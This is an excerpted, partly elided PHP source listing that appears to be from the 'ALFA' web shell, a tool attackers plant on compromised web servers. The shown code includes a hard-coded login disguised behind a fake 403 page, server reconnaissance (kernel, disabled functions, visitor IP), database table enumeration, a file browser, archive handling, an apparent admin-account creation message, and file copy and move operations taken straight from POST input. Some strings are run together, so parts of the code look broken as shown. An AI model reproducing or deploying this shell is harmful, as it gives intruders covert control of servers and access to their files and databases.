...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '338effd8acfcf953ef8cf6c26d01bef4',//bcrypt(sepuh)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><right></html>".$Eform;
exit;
}
...
echo "<body bgcolor=#000000>";echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
...
echo "$disfun";
echo"</font><br>";
echo "<b style='color: #7CFC00'>Your Ip Addressis :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
...
$safe_modes="<spanclass='header_on'>OFF</span>";
...
if($db){
	...
	$data = array();
	$tables_query = mysqli_query($db, "SELECT table_name FROMinformation_schema.tables WHERE table_schema = database();");
	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
...
if($dirContent == false){echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
alfaFooter();
return;
}
global $sort;
...
function get_pagination_links($current_page, $total_pages){
    ...
    if ($total_pages >= 1 && $current_page <= $total_pages) {
        ...
        for (; $i < min($current_page + 6, $total_pages); $i++) {
			if($i == $current_page){
				$selected_page = " active-page-number";}else{
				$selected_page = "";
			}
...
if($solevisible){
__alert('Success... '.$admin.' iscreated...');
}
}
}
...
function __alfa_open_archive_file($arch, $base_id=0){
	try{
		...
		$archive = new PharData($arch);
		 foreach($archive as $file) {$file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
		     if($file->isDir()) {
...
function alfadoActions(){
	...
	if($action == "rename" || $action == "move"){
		...
		if(is_file($_POST["alfa1"])){@copy($_POST["alfa1"], $_POST["alfa2"]);
			echo("done");
